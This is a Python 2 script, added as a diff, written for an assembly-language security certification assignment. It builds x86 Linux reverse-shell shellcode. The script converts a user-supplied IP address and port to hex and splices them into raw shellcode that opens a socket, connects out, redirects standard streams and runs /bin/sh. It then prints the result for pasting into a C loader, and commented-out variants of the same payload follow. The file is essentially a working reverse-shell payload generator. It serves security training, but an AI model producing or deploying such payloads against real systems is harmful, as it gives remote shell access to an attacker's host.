@@ -1,0 +1,122 @@
+import sys
+import struct
+import binascii
+#Author: Aaron Weathersby
+#SLAE #1488
+#Handle: t0b0x0r
+#github:https://github.com/t0b0rX0r/slae/upload/master/assignment2
+#Assignment #2- Reverse Shell
+#created for completing the requirements of the SecurityTube Linux Assembly Expert certification: http://securitytube-training.com/online-courses/securitytube-linux-assembly-expert
+
+def checkport(port):
+
+	if len(port) < 10:
+		print "Port less than 10"
+		port='0x' + port[2:].zfill(4)
+		print "Padded: "+port
+		#sys.exit()
+	elif len(port) < 100:
+		print "Port less than 100"
+		port='0x' + port[2:].zfill(2)
+		print "Padded: "+port
+		#sys.exit()
+	elif len(port) < 1000:
+		print "Port less than 1000"
+		port='0x' + port[2:].zfill(1)
+		print "Padded: "+port
+		#sys.exit()
+	return port
+def checkip(oct):
+	print "Octet: "+str(oct)
+	print "Octet Size: "+str(len(oct))
+	if len(oct) < 4:
+		print "Octet less than 3"
+		oct='0x'+oct[2:].zfill(2)
+		print "Padded: "+oct
+		#sys.exit()
+	elif len(oct) < 5:
+		print "Octet less than 4"
+		oct='0x' + oct[2:].zfill(1)
+		print "Padded: "+oct
+	#print "Exiting checkIP"	
+	#sys.exit()
+	
+	return oct
+
+def main():
+	encoded=""
+	total = len(sys.argv)
+	port=""
+
+	if total != 3:
+		print "Usage: python slae_assignment_2.py [IP] [port]"
+	else:
+		ip=sys.argv[1]
+		ipsplit=ip.split('.')
+		address=""
+		for oct in (ipsplit):
+			
+			
+			octet=hex(int(oct))
+			octet=checkip(octet)
+			address+="\\x"+octet[2]
+			address+=octet[3]
+			print "Octet in Hex: "+octet
+		print "Address in Hex with Padding: "+address
+		
+		
+		ipaddress=""
+		for i in range(-1,-len(address),-2):
+		#for x in range(-1, -len(a), -2):
+		        #new += a[x-1] + a[x]
+		#for i,k in enumerate(address[:-1]):
+			
+			print "Pair: "+address[i]+address[i+1]
+			temp=str(address[i])+str(address[i+1])
+			ipaddress+=address[i-1]+address[i]
+			#ipaddress[i].join(str(address[i]),str(address[i+1]))
+			#ipaddress[address[len(address)-i]]=address[i]+address[i+1]
+		print "Address in Reverse" + ipaddress#address[::-1]#address.join(reversed([address[i:i+2] for i in range(0, len(address), 2)]))
+		port = sys.argv[2]
+		print "Port: "+port
+	
+		port = hex(int(port)) 
+		print "Port in Hex: "+port
+		#Pad port incase its less than 4 Digits
+		port=checkport(port)
+	
+
+		port_Bendian=port[0]+""+port[1]+port[4]+port[5]+port[2]+port[3]
+	
+		be1="\\x"+port_Bendian[2]+port_Bendian[3]
+		be2="\\x"+port_Bendian[4]+port_Bendian[5]
+		print "Big Endian: "+be1 +be2
+		shell=("\x31\xc0\xb0\x66\xb3\x01\x31\xd2\x52\x6a\x01\x6a\x02\x89\xe1\xcd\x80\x89\xc6\x31\xc0\x31\xdb\xb0\x66\xb3\x03\x68"+"\x98"+"\x66\x68"+"\x99"+"\x66\x6a\x02\x89\xe1\x6a\x12\x51\x89\xf7\x56\x89\xe1\xcd\x80\xb0\x66\xb3\x0a\x52\x6a\x14\x54\x56\xcd\x80\x89\xc3\x31\xc9\xb0\x3f\xcd\x80\x41\x80\xf9\x04\x75\xf6\x31\xc0\x50\x68\x2f\x2f\x73\x68\x68\x2f\x62\x69\x6e\x89\xe3\x89\xd1\x89\xc2\xb0\x0b\xcd\x80")
+
+		#working even fewer nulls shell=("\x31\xc0\xb0\x66\xb3\x01\x31\xd2\x52\x6a\x01\x6a\x02\x89\xe1\xcd\x80\x89\xc6\x31\xc0\xb8\x66\x00\x00\x00\xbb\x03\x00\x00\x00\x68"+"\x98"+"\x66\x68"+"\x99"+"\x66\x6a\x02\x89\xe1\x6a\x12\x51\x89\xf7\x56\x89\xe1\xcd\x80\xb0\x66\xb3\x0a\x52\x6a\x14\x54\x56\xcd\x80\x89\xc3\x31\xc9\xb0\x3f\xcd\x80\x41\x80\xf9\x04\x75\xf6\x31\xc0\x50\x68\x2f\x2f\x73\x68\x68\x2f\x62\x69\x6e\x89\xe3\x89\xd1\xba\x00\x00\x00\x00\xb0\x0b\xcd\x80")
+		#working fewer nullsshell=("\xb8\x66\x00\x00\x00\xb3\x01\x31\xd2\x52\x6a\x01\x6a\x02\x89\xe1\xcd\x80\x89\xc6\x31\xc0\xb8\x66\x00\x00\x00\xbb\x03\x00\x00\x00\x68"+"\x98"+"\x66\x68"+"\x99"+"\x66\x6a\x02\x89\xe1\x6a\x12\x51\x89\xf7\x56\x89\xe1\xcd\x80\xb0\x66\xb3\x0a\x52\x6a\x14\x54\x56\xcd\x80\x89\xc3\x31\xc9\xb0\x3f\xcd\x80\x41\x80\xf9\x04\x75\xf6\x31\xc0\x50\x68\x2f\x2f\x73\x68\x68\x2f\x62\x69\x6e\x89\xe3\x89\xd1\xba\x00\x00\x00\x00\xb0\x0b\xcd\x80")
+		#working shell=("\xb8\x66\x00\x00\x00\xbb\x01\x00\x00\x00\x6a\x00\x6a\x01\x6a\x02\x89\xe1\xcd\x80\x89\xc6\xb8\x66\x00\x00\x00\xbb\x03\x00\x00\x00\x68"+"\x98"+"\x66\x68"+"\x99"+"\x66\x6a\x02\x89\xe1\x6a\x10\x51\x89\xf7\x56\x89\xe1\xcd\x80\xb8\x66\x00\x00\x00\xbb\x0a\x00\x00\x00\x6a\x00\x6a\x14\x54\x56\xcd\x80\x89\xc3\x31\xc9\xb0\x3f\xcd\x80\x41\x80\xf9\x04\x75\xf6\x31\xc0\x50\x68\x2f\x2f\x73\x68\x68\x2f\x62\x69\x6e\x89\xe3\xb9\x00\x00\x00\x00\xba\x00\x00\x00\x00\xb0\x0b\xcd\x80")
+
+#shell=("\x31\xc0\xb0\x66\xb3\x01\x31\xd2\x52\x6a\x01\x6a\x02\x89\xe1\xcd\x80\x89\xc6\xb0\x66\xb3\x02\x52\x66\x68"+"\x99"+"\x66\x6a\x02\x89\xe1\x6a\x10\x51\x89\xf7\x56\x89\xe1\xcd\x80\x89\xfe\xb0\x66\xb3\x04\x52\x56\x89\xe1\xcd\x80\xb0\x66\xb3\x05\x52\x52\x56\x89\xe1\xcd\x80\x88\xc3\x31\xc9\xb0\x3f\xcd\x80\x41\x80\xf9\x04\x75\xf6\x31\xc0\x50\x68\x2f\x2f\x73\x68\x68\x2f\x62\x69\x6e\x89\xe3\x89\xd1\xb0\x0b\xcd\x80")
+#		\xc0\xa8\x01\xa0
+		for x in bytearray(shell):
+			
+			#print "Encoded: "+'\\x%02x'%x#+" X: "+str(x)
+			#print "\\x99 ="+ str(bytearray("\\x99"))
+			y='\\x%02x'%x
+			if y==str(bytearray("\\x99")):
+				print "Found Port"
+			
+				encoded+=be2+be1
+			elif y==str(bytearray("\\x98")):
+				print "Found IP address"
+				encoded+=address
+			else:
+				encoded+='\\x'
+				encoded+='%02x' % x
+		print "Paste this into Shellcode.c"
+		print '"'+encoded+'";'
+		
+
+if __name__== "__main__":
+  main()
